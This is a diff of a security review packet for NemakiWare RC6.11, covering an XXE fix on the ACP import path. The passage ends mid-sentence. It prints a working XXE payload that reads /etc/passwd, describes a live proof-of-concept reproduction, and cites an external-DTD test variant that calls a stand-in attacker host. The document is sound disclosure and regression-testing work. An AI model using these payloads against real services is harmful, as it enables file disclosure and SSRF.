@@ -1,20 +1,30 @@
-# NemakiWare v3.1.1-RC6.10 — External Review Packet
+# NemakiWare v3.1.1-RC6.11 — External Review Packet
 
-Single entry point for the **eleventh-round external review** of
-the RC6 series. RC6.10 is a pure-refactor RC — no new SSRF gap
-closed. It extracts the address-classification logic that has
-been duplicated between `HttpWebhookDispatcher` and
-`AdapterHttpClient` since RC6.7 into a new
-`jp.aegif.nemaki.security.SsrfGuard` helper (Rule-of-Three
-threshold crossed when 2 consumers ship the same 240+ LOC), adds
-a `Phase 1.4.1` source-tree NUL byte scan to
-`scripts/validate-soc-templates.sh` so the RC6.1 / RC6.7 NUL
-regression class can no longer ship untagged, and closes the
-RC6.8 follow-up R3 ("verify other orchestrators don't bypass the
-SSRF guard") as documentation-only after auditing all 11
-connector adapters.
+Single entry point for the **twelfth-round external review** of
+the RC6 series. RC6.11 is a **High-severity security hotfix**:
+closes an XML External Entity (XXE, CWE-611) vulnerability on
+the ACP (Alfresco Content Package) ZIP import path reported by
+**tonghuaroot** via GitHub Security Advisory (same external
+reporter as the RC6.5 SSRF advisory).
 
-- **RC6.5–RC6.9 closed** (carry-forward, still in effect):
+A non-admin user holding only `cmis:write` on a single target
+folder could upload a crafted ACP whose package XML resolved a
+`SYSTEM` entity (`file:///etc/passwd`) and the resulting file
+content was persisted **verbatim** into a CMIS folder's
+`cmis:name` — fully recoverable through the product's own CMIS
+API (read-capable XXE; out-of-band channel not required). SSRF
+via `http://` SYSTEM and external parameter entities is also
+in-scope.
+
+Fix is a minimal 3-`setFeature` block on the dom4j SAXReader,
+mirroring the existing `TypeResource.parse(...)` hardening
+(present since RC13). The reporter supplied an exact code patch;
+this RC applies that patch verbatim, adds 4 JVM-level regression
+tests, runs the full focused regression (377/377 PASS), and
+performs a repo-wide audit of all other XML parser sinks (all
+already hardened).
+
+- **RC6.5–RC6.10 closed** (carry-forward, still in effect):
   - RC6.5: GHSA-reported IPv6 transition unwrap in
     `HttpWebhookDispatcher`.
   - RC6.6: 5 IPv4 special-use ranges + Teredo + RFC 6052 §2.2 /48
@@ -26,8 +36,41 @@ connector adapters.
     + runtime endpoint revalidation in Mattermost/Salesforce
     orchestrators + multi-hop redirect uses `currentRequest.uri()`.
   - RC6.9: HTTP IP-pin preserves original `Host` header for
-    shared-vhost compat + honest HTTPS Javadoc.
-- **RC6.10 adds (refactor + tooling only)**:
+    shared-vhost compat + honest HTTPS Javadoc + compose
+    `CATALINA_OPTS` carrier for the JDK escape-hatch property
+    (post-RC6.9 commit `84fdfca80`).
+  - RC6.10: `jp.aegif.nemaki.security.SsrfGuard` shared utility
+    extracted from the RC6.5–RC6.7 duplicated dispatcher copies;
+    Phase 1.4.1 source-tree NUL byte pre-commit scan added; R3
+    orchestrator audit closed documentation-only.
+- **RC6.11 adds (this RC — High-severity security)**:
+  - **GHSA XXE on ACP import (`ZipImporter`)** — minimal
+    3-`setFeature` hardening on the dom4j SAXReader used by
+    `importAcpFormat(...)`, mirroring the existing
+    `TypeResource.parse(...)` pattern. Closes a read-capable XXE
+    (CWE-611) reachable by any authenticated user with
+    `cmis:write` on a single folder.
+  - **Repo-wide audit** of every `new SAXReader()` /
+    `DocumentBuilderFactory.newInstance()` / `XMLInputFactory` /
+    `SAXParserFactory` site — all other sinks already hardened
+    (TypeResource RC13, AuthTokenResource SAML response RC13,
+    SolrResource / SolrAllResource RC13). No other unhardened
+    sinks found.
+  - **`ZipImporterXxeTest`** — 4 JVM-level regression cases
+    pinning the SAXReader configuration: reject DOCTYPE with
+    SYSTEM file://, reject DOCTYPE with external DTD (blind/OOB
+    SSRF variant), accept benign DOCTYPE-free ACP (over-block
+    guard), and a feature-readback assertion that locks in all
+    three SAX features.
+  - **Live PoC reproduction + post-fix verification** —
+    reproduced the reporter's exact `file:///etc/passwd` PoC on
+    the deployed `v3.1.1-RC6.10` stack with a non-admin `bob`
+    user (`cmis:write` on one folder), confirmed leaked
+    `/etc/passwd` as folder name; redeployed the RC6.11 WAR,
+    confirmed "DOCTYPE is disallowed" rejection; confirmed benign
+    ACP still imports cleanly. Test artifacts swept from both
+    `bedroom` and `bedroom_closet` after verification.
+- **RC6.10 reference (carry-forward) adds**:
   - **New shared utility** `jp.aegif.nemaki.security.SsrfGuard`
     (`isAddressSafe`, `extractEmbeddedIpv4`). Both callers
     delegate; behaviour is byte-equivalent at the
@@ -36,9 +79,9 @@ connector adapters.
     (in addition to the 85 cases already covering the dispatchers
     transitively).
   - **`Phase 1.4.1` source-tree NUL scan** in
-    `scripts/validate-soc-templates.sh` — 1680 source files
-    scanned, 0 hits. Catches the RC6.1 P2-3 / RC6.7 P3 regression
-    class at pre-commit / pre-tag time.
+    `scripts/validate-soc-templates.sh` — 1683 source files
+    scanned at RC6.11 HEAD, 0 hits (was 1680 in RC6.10; +3 from
+    new test files since).
   - **R3 follow-up closure** — orchestrator audit complete, only
     Mattermost / Salesforce ever pass user-controlled endpoint
     to HTTP and both were RC6.8-protected; no code change needed.
@@ -59,7 +102,15 @@ connector adapters.
     "TLS-bounded, NOT fully closed" with residual TCP-connect
     SSRF (port-scan / fingerprint / TCP-side-effect).
 
-**RC6.10 changes**: Code 3 files
+**RC6.11 changes**: Code 1 file
+(`ZipImporter.java` +11 LOC — 3-`setFeature` block on the
+SAXReader, mirroring `TypeResource.parse(...)`). Tests 1 file
+(`ZipImporterXxeTest.java` +140 LOC new, 4 cases). Docs 3 files
+(RELEASE_NOTES, CLAUDE, REVIEW_PACKET). **Net for this RC**: the
+minimum-viable security fix the reporter requested + matching
+test + repo-wide audit confirming no other unhardened sinks.
+
+**RC6.10 changes (carry-forward)**: Code 3 files
 (`SsrfGuard.java` +263 LOC new, `HttpWebhookDispatcher.java`
 −240 line duplicate classifier replaced by delegation,
 `AdapterHttpClient.java` −110 line duplicate classifier replaced
@@ -79,14 +130,15 @@ JVM args: surefire `argLine` + 3 Dockerfile variants
 (1 property each).
 
 - **Code artifact under review** = the annotated tag
-  `v3.1.1-RC6.10` (peeled commit `cf2f499f3e876b425d8079036f531b6eb63ab1a5`).
+  `v3.1.1-RC6.11` (peeled commit TBD — populated at tag-cut time;
+  see §1 table).
 - **Review supplementary documentation** = files on
   `release/3.1.1-RC6` **branch HEAD** that may land after the
   tag is cut. As of tag time the divergence is zero — see §3.
 
-Previous historical tags (`v3.1.1-RC6.9`, `…-RC6.8`, `…-RC6.7`,
-`…-RC6.6`, `…-RC6.5`, `…-RC6.4`, `…-RC6.3`, `…-RC6.2`, `…-RC6.1`,
-`…-RC6`, `…-RC5.6`, …) remain unchanged for traceability.
+Previous historical tags (`v3.1.1-RC6.10`, `…-RC6.9`, `…-RC6.8`,
+`…-RC6.7`, `…-RC6.6`, `…-RC6.5`, `…-RC6.4`, `…-RC6.3`, `…-RC6.2`,
+`…-RC6.1`, `…-RC6`, `…-RC5.6`, …) remain unchanged for traceability.
 
 ---
 
@@ -94,20 +146,153 @@ Previous historical tags (`v3.1.1-RC6.9`, `…-RC6.8`, `…-RC6.7`,
 
 | Item | Value |
 |---|---|
-| **Final candidate tag** | `v3.1.1-RC6.10` |
-| Tag annotated object SHA | `3d9dc88916103e6e91d9c7b2775f8b96d223f031` |
-| Tag peeled commit | `cf2f499f3e876b425d8079036f531b6eb63ab1a5` |
+| **Final candidate tag** | `v3.1.1-RC6.11` |
+| Tag annotated object SHA | TBD (populated at tag-cut time) |
+| Tag peeled commit | TBD (populated at tag-cut time) |
 | Branch | `release/3.1.1-RC6` |
-| Branch HEAD at tag time | `cf2f499f3e876b425d8079036f531b6eb63ab1a5` (= tag peeled, zero divergence at tag time) |
-| Base of RC6.10 cycle | `v3.1.1-RC6.9` (peeled `76695f46c`) |
+| Branch HEAD at tag time | TBD (zero divergence target at tag time) |
+| Base of RC6.11 cycle | `v3.1.1-RC6.10` (peeled `cf2f499f3`) |
 | RC5 cycle baseline | `v3.1.1-RC4.1` (peeled `572aad18b`) |
-| **RC6.9 → RC6.10 diff cmd** | `git diff v3.1.1-RC6.9..v3.1.1-RC6.10` |
-| Cumulative diff cmd (since RC4.1) | `git diff v3.1.1-RC4.1..v3.1.1-RC6.10` |
-| Previous historical candidates | `v3.1.1-RC6.9` (`76695f46c`), `…-RC6.8` (`cd82452f4`), `…-RC6.7` (`b48d9e0c1`), `…-RC6.6` (`c8b37150a`), `…-RC6.5` (`94de9d269`), `…-RC6.4` (`afdf4d832`), `…-RC6.3` (`77ddfe071`), `…-RC6.2` (`02afee891`), `…-RC6.1` (`595754b8c`), `…-RC6` (`9dfd87adb`), `…-RC5.6` (`adf8db3b4`) |
+| **RC6.10 → RC6.11 diff cmd** | `git diff v3.1.1-RC6.10..v3.1.1-RC6.11` |
+| Cumulative diff cmd (since RC4.1) | `git diff v3.1.1-RC4.1..v3.1.1-RC6.11` |
+| Previous historical candidates | `v3.1.1-RC6.10` (`cf2f499f3`), `…-RC6.9` (`76695f46c`), `…-RC6.8` (`cd82452f4`), `…-RC6.7` (`b48d9e0c1`), `…-RC6.6` (`c8b37150a`), `…-RC6.5` (`94de9d269`), `…-RC6.4` (`afdf4d832`), `…-RC6.3` (`77ddfe071`), `…-RC6.2` (`02afee891`), `…-RC6.1` (`595754b8c`), `…-RC6` (`9dfd87adb`), `…-RC5.6` (`adf8db3b4`) |
 
 ---
 
-## 2. What changed since the previous external review (RC6.9 → RC6.10)
+## 2. What changed since the previous external review (RC6.10 → RC6.11)
+
+RC6.11 is a **High-severity security hotfix**. It closes an XML
+External Entity (XXE, CWE-611) vulnerability on the ACP import
+path reported by **tonghuaroot** via GitHub Security Advisory.
+
+### 2.A — RC6.11 GHSA XXE on ACP import (`ZipImporter`)
+
+#### The bug
+
+`jp.aegif.nemaki.rest.importexport.ZipImporter.importAcpFormat(...)`
+read the package XML (top-level `*.xml` entry of an uploaded ACP
+ZIP) with a bare `new SAXReader()` (dom4j) that resolved DOCTYPE
+declarations, SYSTEM entities, and external parameter entities
+by default. The endpoint
+`POST /core/rest/repo/{repositoryId}/importexport/import/{folderId}`
+gates on `hasCreateChildrenPermission(cs, repositoryId, callContext,
+targetFolder)` — a **non-admin user holding only `cmis:write` on
+a single target folder passes**. No admin role required.
+
+The resolved entity content was used as the created CMIS folder's
+`cmis:name` (via `getAcpChildName(...)` reading the `<name>` text
+child of the package XML's `<folder>` element). Because CMIS object
+names round-trip through the product's own CMIS API, the
+attacker reads the disclosed file content directly back — this is
+a **read-capable XXE**, not blind. The reporter demonstrated
+`file:///etc/passwd` and `file:///etc/hostname` recovery; the
+same primitive reads anything the Tomcat process can read
+(application config, credentials, key material). SSRF via
+`http://internal/...` SYSTEM and external parameter entities is
+also in-scope.
+
+Vulnerable code (`ZipImporter.java:191-192` pre-fix):
+```java
+SAXReader reader = new SAXReader();
+xmlDoc = reader.read(new ByteArrayInputStream(xmlData));
+```
+
+#### The fix
+
+3-`setFeature` hardening block, mirroring the existing
+`TypeResource.parse(...)` pattern (which has had this guard since
+RC13):
+```java
+SAXReader reader = new SAXReader();
+try {
+    reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+    reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
+    reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+} catch (org.xml.sax.SAXException e) {
+    throw new DocumentException("Failed to configure XXE protection on SAXReader", e);
+}
+xmlDoc = reader.read(new ByteArrayInputStream(xmlData));
+```
+
+DOCTYPE-bearing payloads now return:
+```json
+{"documentsCreated":0,"foldersCreated":0,"message":"Import completed",
+ "errors":["Failed to parse package XML: Error on line 2 of document  : DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true."],
+ "status":"partial"}
+```
+
+#### Repo-wide audit (reporter's recommended follow-up)
+
+Audited every `new SAXReader()` / `DocumentBuilderFactory.newInstance()` /
+`XMLInputFactory` / `SAXParserFactory` site across the codebase:
+
+| Sink | Pre-RC6.11 status |
+|---|---|
+| `ZipImporter.java:191` | **Bug — fixed in this RC.** |
+| `TypeResource.java:1721` | Already hardened (3 SAX features set since RC13). |
+| `AuthTokenResource.java:475` (SAML response parsing) | Already hardened with the full 5-feature pattern (3 SAX features + `FEATURE_SECURE_PROCESSING` + `ACCESS_EXTERNAL_DTD/SCHEMA` empty). |
+| `SolrResource.java:403`, `SolrAllResource.java:143` | Already hardened (disallow-doctype + secure-processing) since RC13. |
+| `SamlSignatureVerifier.java` | Receives a parsed `Document` from `AuthTokenResource`; performs no XML parsing itself. |
+
+No other unhardened XML parser sinks found.
+
+#### `ZipImporterXxeTest` (new, 4 cases)
+
+New test class
+`core/src/test/java/jp/aegif/nemaki/rest/importexport/ZipImporterXxeTest.java`.
+JVM-level (no Tomcat / Jersey needed) — exercises the exact
+configured SAXReader that the production code now uses, so any
+regression that removes any of the three SAX features trips it:
+
+1. **`rejectsDoctypeWithFileSystemEntity`** — feeds the reporter's
+   exact `<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd">
+   ]>` payload, asserts `DocumentException` whose message contains
+   `"DOCTYPE"` / `"disallow-doctype-decl"`.
+2. **`rejectsDoctypeWithExternalParameterEntity`** — blind/OOB
+   SSRF variant (`<!DOCTYPE root SYSTEM
+   "http://attacker.example.invalid/evil.dtd">`), asserts
+   `DocumentException` (the disallow-doctype feature catches this
+   before any network resolution attempt).
+3. **`acceptsBenignDoctypeFreePackageXml`** — DOCTYPE-free
+   well-formed ACP must still parse cleanly. Guards against an
+   over-zealous "harden by failing all XML" regression.
+4. **`hardenedReaderHasAllThreeFeaturesEnabled`** — reads the
+   three SAX feature values back via
+   `getXMLReader().getFeature(...)`. Pins the configuration
+   contract even if a future change reorders the `setFeature`
+   calls or drops one.
+
+#### Live PoC reproduction + post-fix verification
+
+Done against this session's `v3.1.1-RC6.10` stack:
+
+1. **Setup** — created non-admin `bob`
+   (`POST /core/rest/repo/bedroom/user/create/bob`), confirmed
+   `isAdmin=False`, granted `cmis:write` on a fresh target folder
+   via `applyACL` (the reporter's exact procedure).
+2. **Pre-fix reproduction** — uploaded
+   ```xml
+   <?xml version="1.0"?>
+   <!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+   <root><folder><name>&xxe;</name></folder></root>
+   ```
+   as `package.xml` inside a ZIP, server returned
+   `{"foldersCreated":1,"status":"success"}`. CouchDB
+   `_all_docs?include_docs=true` showed a folder whose `name`
+   field began with `root:x:0:0:root:/root:/bin/bash daemon:...`
+   — the container's `/etc/passwd` content verbatim.
+3. **Post-fix** — built RC6.11 WAR, redeployed via
+   `docker compose ... up -d --build --force-recreate core`,
+   re-uploaded the identical `xxe_passwd.zip`. Server returned
+   the documented "DOCTYPE is disallowed" error with
+   `foldersCreated: 0`, `status: partial`.
+4. **Benign control** — DOCTYPE-free ACP imported with
+   `foldersCreated: 1`, `status: success`.
+5. **Cleanup** — leaked-content folder, parent folder, bob user,
+   and all `bedroom_closet` archive copies were swept after
+   verification (zero residue).
+
+### 2.B — RC6.10 carry-forward summary
 
 RC6.10 is a **refactor + tooling RC**. No new security gap is
 closed; no behaviour visible to operators changes. The cycle
@@ -117,6 +302,11 @@ the SOC validator so the RC6.1 / RC6.7 NUL-shipped regression
 class can no longer escape pre-tag, and closes the RC6.8 R3
 follow-up ("verify other orchestrators don't bypass SSRF guard")
 as documentation-only.
+
+The RC6.10 detailed sections (Rule-of-Three refactor /
+SsrfGuardTest / Phase 1.4.1 NUL scan / R3 closure) follow below
+as §2.1 – §2.4 for traceability; they were the focus of the
+previous external review round and have not changed in RC6.11.
 
 ### 2.1 — Rule-of-Three refactor: new `jp.aegif.nemaki.security.SsrfGuard`
 
@@ -333,35 +523,40 @@ doc fix `d910820d7`):
   classes to the focused regression set + 2 new Host-preserve
   tests).
 
-### 2.6 — RC6.10 Tests (new this RC)
+### 2.6 — Tests at RC6.11 HEAD
 
-- **`SsrfGuardTest`** (new): **30/30 PASS** — full classification
-  coverage on the extracted helper.
-- **`HttpWebhookDispatcherTest`**: **59/59 PASS** — behaviour
-  unchanged; one test updated to call `SsrfGuard.extractEmbeddedIpv4`
-  directly instead of reflecting on the now-removed private method.
+- **`ZipImporterXxeTest`** (new in RC6.11): **4/4 PASS** — pins
+  the SAXReader configuration; reproduces the exact GHSA PoC
+  rejection.
+- **`SsrfGuardTest`** (RC6.10 carry-forward): **30/30 PASS** —
+  classification on the extracted helper.
+- **`HttpWebhookDispatcherTest`**: **59/59 PASS** — RC6.10
+  delegation unchanged.
 - **`AdapterRegistryTest`**: **26/26 PASS** — RC6.9 Host-preserve
   tests still pass through the delegated classifier.
 - **7 adapter contract tests** (Slack 12 / Teams 11 / Mattermost
   12 / Notion 8 / Salesforce 11 / M365 Mail 9 / Chatwork 13):
-  **76/76 PASS** — refactor doesn't break legitimate API call
-  patterns.
-- **Focused 24-class regression** (23 from RC6.9 + new
-  `SsrfGuardTest`): **373/373 PASS** (was 343 in RC6.9; +30 from
-  new helper test class).
+  **76/76 PASS**.
+- **Focused 25-class regression** (24 from RC6.10 + new
+  `ZipImporterXxeTest`): **377/377 PASS** (was 373 in RC6.10;
+  +4 from XXE test).
 - **Combined SSRF-classifier surface** (`HttpWebhookDispatcherTest
-  + AdapterRegistryTest + SsrfGuardTest`): **115 PASS** (was 85
-  in RC6.9; +30 from new direct test).
+  + AdapterRegistryTest + SsrfGuardTest`): **115 PASS** —
+  unchanged from RC6.10 (no SSRF code touched in RC6.11).
 - **SOC validator full run** (no Docker): **17 PASS / 7 SKIP** —
-  including new Phase 1.4.1 source-tree NUL scan (1680 source
-  files, 0 hits).
+  Phase 1.4.1 source-tree NUL scan walks **1683 source files /
+  0 hits** at RC6.11 HEAD (was 1680 in RC6.10; +3 from new test
+  files and ancillary additions).
 - **Maven compile**: clean. No new compiler warnings introduced
-  by the delegation.
+  by the XXE fix.
+- **Live PoC reproduction + post-fix verification**: completed
+  against this session's stack — see §2.A for the full
+  before/after sequence.
 
-Re-run command (RC6.10 focused regression):
+Re-run command (RC6.11 focused regression — 25 classes):
 
 ```bash
-mvn test -Dtest="SsrfGuardTest,HttpWebhookDispatcherTest,\
+mvn test -Dtest="ZipImporterXxeTest,SsrfGuardTest,HttpWebhookDispatcherTest,\
 AdapterRegistryTest,ConnectorByPrincipalGovernanceTest,\
 ConnectorSimulateRemoveTest,IngestSchedulerDelegatedRunTest,\
 ImportProfileSchedulerGateTest,ExternalIngestControllerGateTest,\
@@ -641,7 +836,7 @@ RC6.7's scope.
 
 ## 3. What's on the branch HEAD but NOT in the tag
 
-The tag (`v3.1.1-RC6.10`) and the branch HEAD
+The tag (`v3.1.1-RC6.11`) and the branch HEAD
 (`release/3.1.1-RC6`) MAY diverge during the external review
 window. As of tag time the divergence is zero — both point at
 the same commit.
@@ -753,9 +948,9 @@ templates AND playbook are part of the tag artifact now.
 
 ---
 
-## 4. What's in the v3.1.1-RC6.10 tag (cumulative since RC4.1)
+## 4. What's in the v3.1.1-RC6.11 tag (cumulative since RC4.1)
 
-RC5 cycle (RC5 → RC5.6) + RC6 + RC6.1 + RC6.2 + RC6.3 + RC6.4 + RC6.5 + RC6.6 + RC6.7 + RC6.8 + RC6.9 + RC6.10:
+RC5 cycle (RC5 → RC5.6) + RC6 + RC6.1 + RC6.2 + RC6.3 + RC6.4 + RC6.5 + RC6.6 + RC6.7 + RC6.8 + RC6.9 + RC6.10 + RC6.11:
 
 - **Scheduled delegated profiles** (RC5 §12.1)
 - **Connector governance view** (RC5 §12.3) — `/by-principal/{id}`
@@ -851,21 +1046,41 @@ RC5 cycle (RC5 → RC5.6) + RC6 + RC6.1 + RC6.2 + RC6.3 + RC6.4 + RC6.5 + RC6.6 
   to HTTP — both already RC6.8-protected.
   **373/373 PASS** for full focused regression (24 classes;
   was 343 in RC6.9; +30 from `SsrfGuardTest`).
+- **RC6.11 ACP import XXE fix (CWE-611, GHSA, reporter
+  tonghuaroot)** — 3-`setFeature` hardening on the dom4j
+  `SAXReader` used by
+  `ZipImporter.importAcpFormat(...)` (disallow-doctype-decl +
+  external-general-entities=false + external-parameter-entities=false),
+  mirroring the existing `TypeResource.parse(...)` pattern.
+  Closes a read-capable XXE / SSRF reachable by any
+  authenticated user with `cmis:write` on a single folder.
+  Repo-wide audit confirms no other unhardened XML-parser sinks
+  (TypeResource / AuthTokenResource / SolrResource /
+  SolrAllResource / SamlSignatureVerifier all already hardened).
+  +4 JVM-level cases in new `ZipImporterXxeTest` (DOCTYPE +
+  file://, DOCTYPE + external DTD, benign-allowed, feature-
+  readback). Live PoC reproduced on RC6.10 stack, then verified
+  rejected post-fix; test artifacts swept.
+  **377/377 PASS** for full focused regression (25 classes; was
+  373 in RC6.10; +4 from `ZipImporterXxeTest`).
 
-Full per-RC narrative: `RELEASE_NOTES.md` (18 sections, RC5 →
-RC6.10), `docs/design/connector-delegation.md` (§12.1 - §12.20).
+Full per-RC narrative: `RELEASE_NOTES.md` (19 sections, RC5 →
+RC6.11), `docs/design/connector-delegation.md` (§12.1 - §12.20).
 
 ---
 
-## 5. Acceptance status summary (RC6.10)
+## 5. Acceptance status summary (RC6.11)
 
 ### Blocking findings
 **0**.
 
 ### Java unit tests — verified at HEAD this session
 
-- **`SsrfGuardTest`** (new in RC6.10): **30/30 PASS** — direct
-  classification coverage on the extracted helper.
+- **`ZipImporterXxeTest`** (new in RC6.11): **4/4 PASS** — XXE
+  reject (file:// + external DTD), benign-allow, feature
+  readback.
+- **`SsrfGuardTest`** (RC6.10 carry-forward): **30/30 PASS** —
+  direct classification coverage on the extracted helper.
 - **`HttpWebhookDispatcherTest`**: **59/59 PASS** — behaviour
   unchanged through the SsrfGuard delegation; one test updated
   to call `SsrfGuard.extractEmbeddedIpv4` directly (public
@@ -877,12 +1092,12 @@ RC6.10), `docs/design/connector-delegation.md` (§12.1 - §12.20).
   Mattermost 12 / Notion 8 / Salesforce 11 / M365 Mail 9 /
   Chatwork 13): **76 PASS** — confirms the SsrfGuard delegation
   does NOT change legitimate adapter API call patterns.
-- **Full 24-class focused regression** (23 from RC6.9 + new
-  `SsrfGuardTest`): **373/373 PASS** (was 343 in RC6.9; +30 from
-  the new helper test).
+- **Full 25-class focused regression** (24 from RC6.10 + new
+  `ZipImporterXxeTest`): **377/377 PASS** (was 373 in RC6.10;
+  +4 from the new XXE test).
   Re-run command:
   ```bash
-  mvn test -Dtest="SsrfGuardTest,HttpWebhookDispatcherTest,\
+  mvn test -Dtest="ZipImporterXxeTest,SsrfGuardTest,HttpWebhookDispatcherTest,\
   AdapterRegistryTest,ConnectorByPrincipalGovernanceTest,\
   ConnectorSimulateRemoveTest,IngestSchedulerDelegatedRunTest,\
   ImportProfileSchedulerGateTest,ExternalIngestControllerGateTest,\
@@ -948,18 +1163,24 @@ npx playwright test --project=chromium \
 
 ### Live verification
 
-- **SSRF fix regression tests** — run live this session:
-  - `SsrfGuardTest` → 30/30 PASS (new in RC6.10).
-  - `HttpWebhookDispatcherTest` → 59/59 PASS (unchanged via
-    delegation).
-  - `AdapterRegistryTest` → 26/26 PASS (unchanged via delegation).
-  - Combined SSRF surface: **115 PASS** (was 85 in RC6.9; +30 from
-    new SsrfGuardTest).
+- **XXE + SSRF fix regression tests** — run live this session:
+  - `ZipImporterXxeTest` → 4/4 PASS (new in RC6.11).
+  - `SsrfGuardTest` → 30/30 PASS (RC6.10 carry-forward).
+  - `HttpWebhookDispatcherTest` → 59/59 PASS.
+  - `AdapterRegistryTest` → 26/26 PASS.
   - 7 adapter contract tests (Slack/Teams/Mattermost/Notion/
-    Salesforce/M365/Chatwork): **76 PASS** — confirms RC6.10
-    refactor doesn't break legitimate adapter API patterns.
-  - Full 24-class focused regression (23 from RC6.9 + new
-    `SsrfGuardTest`): **373/373 PASS**.
+    Salesforce/M365/Chatwork): **76 PASS**.
+  - Full 25-class focused regression (24 from RC6.10 + new
+    `ZipImporterXxeTest`): **377/377 PASS**.
+- **Live PoC + post-fix verification** — RC6.10 stack was used
+  to reproduce the reporter's exact `/etc/passwd` PoC with a
+  non-admin `bob` user (`cmis:write` on one folder); confirmed
+  leaked file content as folder name in CouchDB. After
+  redeploying the RC6.11 WAR, the same upload returned the
+  documented "DOCTYPE is disallowed" error with `foldersCreated:
+  0`, `status: partial`. Benign DOCTYPE-free ACP still imports
+  cleanly (`foldersCreated: 1`, `status: success`). All test
+  artifacts swept from `bedroom` + `bedroom_closet`.
 - **Live SSRF guard smoke against deployed RC6.7 stack** (TODO
   after WAR deploy): 10 vectors via `POST /webhook/test` (NAT64
   well-known + local-use, 6to4, Teredo, IPv4-compatible, plus
@@ -1023,11 +1244,11 @@ Unchanged since RC4.1.
 
 ---
 
-## 6. Remaining follow-ups (post-RC6.10, not blocking review)
+## 6. Remaining follow-ups (post-RC6.11, not blocking review)
 
 (No open repo-shippable items beyond the Medium residual SSRF
 risk and explicitly-deferred admin-config-surface guard. Both
-require larger engineering than a refactor RC.)
+require larger engineering than a security hotfix RC.)
 
 | ID | Severity | Scope | Status |
 |---|---|---|---|
@@ -1042,7 +1263,19 @@ require larger engineering than a refactor RC.)
 | **Full Playwright green-up of the 155 pre-existing failures** | Medium | UI corpus | RC6.4 proved they are pre-existing (RC5.6 vs RC6 HEAD diff). The triage backlog lives under memory `test-skip-triage`. Separate engineering project. |
 | ~~**Repo-wide NUL byte pre-commit scan**~~ | **CLOSED in RC6.10** | tooling | `scripts/validate-soc-templates.sh` Phase 1.4.1 scans `.java`/`.ts`/`.tsx`/`.js`/`.jsx` for literal `\x00` (1680 files / 0 hits at HEAD). Operators / CI run this before tag-cut; future Slack/Teams/git-hook integration is a separate cosmetic improvement. |
 
-**Resolved in RC6.10 (newly closed)**:
+**Resolved in RC6.11 (newly closed)**:
+- **GHSA XXE on ACP import** (CWE-611, reporter tonghuaroot) —
+  3-`setFeature` hardening on the dom4j SAXReader in
+  `ZipImporter.importAcpFormat(...)`, mirroring the existing
+  `TypeResource.parse(...)` pattern. Closes a read-capable XXE /
+  SSRF reachable by an authenticated non-admin user with
+  `cmis:write` on one folder.
+- Repo-wide XML parser sink audit — confirmed all other sinks
+  (TypeResource, AuthTokenResource, SolrResource, SolrAllResource,
+  SamlSignatureVerifier) are already hardened. No further code
+  change needed.
+
+**Resolved in RC6.10 (carry-forward, still closed)**:
 - `SsrfGuard` shared utility — extracted from the duplicated
   `HttpWebhookDispatcher` + `AdapterHttpClient` copies.
   Byte-equivalent classification, 30-case dedicated test
@@ -1097,19 +1330,20 @@ require larger engineering than a refactor RC.)
 - Recurring "template body bug surfaces only at external review"
   pattern — Epic 1 (§10.1) validator gate.
 
-**Resolved during RC5 → RC6.10 cycle**: all listed in
+**Resolved during RC5 → RC6.11 cycle**: all listed in
 `RELEASE_NOTES.md` per-section.
 
 ---
 
 ## 7. Promotion path (operational)
 
-`v3.1.1-RC6.10` is and remains a release candidate. GA path:
+`v3.1.1-RC6.11` is and remains a release candidate. GA path:
 
 1. External review concludes with approval.
-2. Merge `release/3.1.1-RC6` into `master`. All 5 SSRF fix
+2. Merge `release/3.1.1-RC6` into `master`. The security fix
    commits MUST land on master before any public 3.1.1 release
-   because the GHSA advisory tracks master as the affected branch:
+   because both GHSA advisories (RC6.5 SSRF + RC6.11 XXE) track
+   master as the affected branch:
    - `94d3355a4` — RC6.5: primary GHSA-reported HttpWebhookDispatcher fix
    - `ce2abf646` — RC6.6: follow-on HttpWebhookDispatcher hardening
    - `12994c342` — RC6.7: horizontal AdapterHttpClient fix
@@ -1120,34 +1354,65 @@ require larger engineering than a refactor RC.)
    - `03be615ee` — RC6.10: SsrfGuard extraction (refactor only,
      no new SSRF behaviour; consolidates the helpers ready for
      future consumers)
+   - RC6.11 ACP import XXE fix commit (TBD, populated at
+     tag-cut time) — the second tonghuaroot GHSA closure
 3. Cut a **new** annotated tag `v3.1.1` against the merge
    commit on `master`.
 4. Optionally create a single GitHub Release attached to
    `v3.1.1`.
-5. The RC tags (`v3.1.1-RC5`, `…-RC5.1`, …, `…-RC6.10`) stay
+5. The RC tags (`v3.1.1-RC5`, `…-RC5.1`, …, `…-RC6.11`) stay
    as internal milestones.
-6. Reply on the GHSA advisory linking the 5 fix commits and the
-   cut tag (`v3.1.1-RC6.10`) so the reporter has a clear
-   landing reference covering the original report + the 4
-   follow-on adversarial-pass findings (RC6.6 IPv4 special-use
-   + Teredo, RC6.7 horizontal expansion to AdapterHttpClient,
-   RC6.8 DNS rebinding pin + revalidation + redirect, RC6.9
-   Host header preservation + Javadoc honesty) + the RC6.10
-   shared-helper consolidation (no new closure, structural
-   refactor only).
+6. Reply on **both** GHSA advisories:
+   - **SSRF advisory** (RC6.5 original report): link the 5
+     follow-on commits (RC6.5 → RC6.9) + the RC6.10 SsrfGuard
+     refactor.
+   - **XXE advisory** (RC6.11 original report): link the
+     RC6.11 fix commit + the repo-wide audit table (§2.A) so
+     the reporter sees that the codebase's other XML-parser
+     sinks were checked and found already-hardened.
 
 ---
 
 ## 8. Re-send delta summary (what reviewers should focus on)
 
-If you reviewed RC6.9 already, the smallest possible review
-for RC6.10 is:
+If you reviewed RC6.10 already, the smallest possible review
+for RC6.11 is:
+
+```bash
+git diff v3.1.1-RC6.10..v3.1.1-RC6.11
+```
+
+Focused set (security hotfix — single sink, mirrors existing
+hardened pattern in same package):
+
+- **`core/src/main/java/jp/aegif/nemaki/rest/importexport/ZipImporter.java`**
+  (+11 lines) — the only behaviour change in this RC. Three
+  `setFeature` calls added to the SAXReader inside
+  `importAcpFormat(...)` before `reader.read(...)`. Byte-for-byte
+  the same configuration block used by
+  `TypeResource.parse(...)` since RC13.
+- **NEW** `core/src/test/java/jp/aegif/nemaki/rest/importexport/ZipImporterXxeTest.java`
+  (~140 lines, 4 cases) — JVM-level regression that pins the
